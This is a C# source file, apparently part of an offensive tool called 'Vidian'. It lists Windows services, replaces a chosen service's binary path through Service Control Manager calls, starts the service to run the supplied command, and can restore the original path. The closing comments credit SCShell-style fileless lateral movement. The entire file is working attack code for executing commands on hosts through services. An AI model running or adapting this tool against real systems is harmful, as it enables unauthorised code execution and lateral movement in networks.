using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ServiceProcess;
using System.Runtime.InteropServices;
using CommandLine;
using Microsoft.Win32;


namespace Vidian
{
    class Options
    {
        [Option("modify", Required = false, HelpText = "Modify the supplied service")]
        public bool modify { get; set; }

        [Option("list", Required = false, HelpText = "List all services")]
        public bool list { get; set; }

        [Option("execute", Required = false, HelpText = "Domain to connect to")]
        public bool execute { get; set; }

        [Option("name", Required = false, HelpText = "The name of the service to interact with")]
        public string name { get; set; }

        [Option("binpath", Required = false, HelpText = "Modify the binpath of the supplied service")]
        public string binpath { get; set; }

        [Option("original", Required = false, HelpText = "Put back the original binpath of the supplied service after execution")]
        public bool original { get; set; }
    }

    class Services
    {
        //GetLastError
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        // OpenSCManager
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, SCM_ACCESS dwDesiredAccess);

        // OpenServiceA
        [DllImport("advapi32.dll", EntryPoint = "OpenServiceA", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, SERVICE_ACCESS dwDesiredAccess);

        // QueryServiceConfigA
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, int cbBufSize, ref int pcbBytesNeeded);

        // StartService
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        // ChangeServiceConfigW
        [DllImport("Advapi32.dll", EntryPoint = "ChangeServiceConfigA", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig(IntPtr hService,
            int dwServiceType,
            int dwStartType,
            int dwErrorControl,
            [In] string lpBinaryPathName,
            [In] string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            [In] string lpDependencies,
            [In] string lpServiceStartName,
            [In] string lpPassWord,
            [In] string lpDisplayName
        );

        private struct QueryServiceConfigStruct
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }

        public enum ACCESS_MASK : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
        }
        public enum SCM_ACCESS : uint
        {
            SC_MANAGER_CONNECT = 0x00001,
            SC_MANAGER_CREATE_SERVICE = 0x00002,
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
            SC_MANAGER_LOCK = 0x00008,
            SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
            SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,
            SC_MANAGER_ALL_ACCESS = ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                SC_MANAGER_CONNECT |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_LOCK |
                SC_MANAGER_QUERY_LOCK_STATUS |
                SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_QUERY_LOCK_STATUS,

            GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

            GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
        }

        public enum SERVICE_ACCESS : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                              SERVICE_QUERY_CONFIG |
                              SERVICE_CHANGE_CONFIG |
                              SERVICE_QUERY_STATUS |
                              SERVICE_ENUMERATE_DEPENDENTS |
                              SERVICE_START |
                              SERVICE_STOP |
                              SERVICE_PAUSE_CONTINUE |
                              SERVICE_INTERROGATE |
                              SERVICE_USER_DEFINED_CONTROL),
            SERVICE_MODIFY_EXECUTE = (SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG)
        }
        public static Options opts = new Options();

        public static void services(string[] args)
        {
            int bytesNeeded = 5;

            try
            {
                var parsedResult = Parser.Default.ParseArguments<Options>(args.Skip(1)).WithParsed(parser => opts = parser);
                if (args.Length == 0)
                {
                    Utils.print.red("[-] Use --help to show options");
                    return;
                }

                if (opts.list)
                {
                    Utils.print.white("\t[*] Discovered services : ");

                    ServiceController[] serviceList = ServiceController.GetServices();

                    foreach (ServiceController service in serviceList)
                    {
                        Utils.print.white("\tName : " + service.ServiceName);
                        Utils.print.white("\tStatus: " + service.Status);
                    }
                }
                // SPN Discvory
                else if (opts.modify)
                {
                    IntPtr schManager = OpenSCManager(null, null, SCM_ACCESS.GENERIC_READ);
                    if (schManager == IntPtr.Zero)
                    {
                        Utils.print.red("[-]  OpenSCManagerA failed!Error:{ 0} "+ GetLastError());
                    }
                    /*Utils.print.blue("[*] Modifying a service");*/
                    if (!string.IsNullOrEmpty(opts.name))
                    {
                        Utils.print.white("\t[*] Modifying the following service : " + opts.name);
                        /*ServiceController service = new ServiceController(opts.name);
                        SafeHandle serviceHandle = service.ServiceHandle;*/

                        IntPtr serviceHandle = OpenService(schManager, opts.name, SERVICE_ACCESS.SERVICE_MODIFY_EXECUTE);
                        Console.WriteLine(serviceHandle);
                        if (!string.IsNullOrEmpty(opts.binpath))
                        {
                            bool callResult;
                            /*originalBinPath = service.GetImagePath();*/
                            QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
                            IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
                            int retCode = QueryServiceConfig(serviceHandle, qscPtr, 0, ref bytesNeeded);
                            if (retCode == 0 && bytesNeeded == 0)
                            {
                                Utils.print.red("\t[-] QueryServiceConfig failed to read the service path. Error: " + GetLastError());
                            }
                            else
                            {
                                Utils.print.green("\t[+] LPQUERY_SERVICE_CONFIGA need " + bytesNeeded + " bytes");
                                qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                                retCode = QueryServiceConfig(serviceHandle, qscPtr, bytesNeeded, ref bytesNeeded);
                                qscs.binaryPathName = IntPtr.Zero;
                                qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new QueryServiceConfigStruct().GetType());
                            }

                            string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
                            Utils.print.white("\t[*] Original binpath : " + originalBinaryPath);
                            Marshal.FreeCoTaskMem(qscPtr);
                            if (callResult = ChangeServiceConfig(serviceHandle, -1, -1, -1, opts.binpath, null, IntPtr.Zero, null, null, null, null))
                            {
                                
                                Utils.print.green("\t[+] Modified the following service : " + opts.name);
                            }
                            else
                            {
                                Utils.print.red("\t[-] Could not modify the service : " + opts.name);
                                Utils.print.red("\tError : " + GetLastError());
                            }
                            if (opts.execute)
                            {
                                try
                                {
                                    Utils.print.white("\t[*] Executing service after modification : " + opts.name);
                                    callResult = StartService(serviceHandle, 0, null);
                                    uint dwResult = GetLastError();
                                    if (!callResult && dwResult != 1053)
                                    {
                                        Utils.print.red("\t[-] Could not start service : " + opts.name + ", Error : " + GetLastError());
                                    }
                                    else
                                    {
                                        Utils.print.green("\t[+] Started service " + opts.name);
                                    }
                                    
                                }
                                catch (InvalidOperationException)
                                {
                                    
                                }
                            }
                            else
                            {
                                Utils.print.white("\t[!] Service : " + opts.name + " will not be started, pass --execute after modification");
                            }
                            if (opts.original)
                            {
                                Utils.print.white("\t[*] Current binpath : " + opts.binpath);
                                if (callResult = ChangeServiceConfig(serviceHandle, -1, -1, -1, originalBinaryPath, null, IntPtr.Zero, null, null, null, null))
                                {
                                    Utils.print.green("\t[+] binpath was reverted to original value: " + opts.name);
                                }
                                else
                                {
                                    Utils.print.red("\t[-] Could not modify the service : " + opts.name);
                                    Utils.print.red("\tError : " + GetLastError());
                                }
                            }
                            else 
                            {
                                Utils.print.white("\t[!] Service : " + opts.name + "'s original binpath will not be put back, pass --original after modification and execution");
                            }
                        }
                        else
                        {
                            Utils.print.red("[-] Provide the binpath you want to use");
                        }
                    }
                    else
                    {
                        Utils.print.red("[-] Provide the name of the service to modify");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}

//https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scshell-fileless-lateral-movement-using-service-manager/
//https://gist.github.com/FusRoDah061/d04dc0bbed890ba0e93166da2b62451e
// https://github.com/Mr-Un1k0d3r/SCShell/blob/master/SharpSCShell.cs